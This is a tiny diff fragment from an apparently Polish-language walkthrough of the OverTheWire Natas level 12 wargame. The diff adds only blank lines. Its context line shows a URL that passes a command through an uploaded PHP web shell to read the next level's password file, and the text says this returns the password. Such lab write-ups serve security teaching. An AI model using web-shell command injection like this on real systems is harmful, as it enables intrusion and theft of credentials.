@@ -149,3 +149,5 @@ Wpisanie w url:
 http://natas12.natas.labs.overthewire.org/upload/v7bg91y73p.php?cmd=cat%20../../../../../etc/natas_webpass/natas13
 ```
 zwróci hasło do następnego poziomu.
+
+
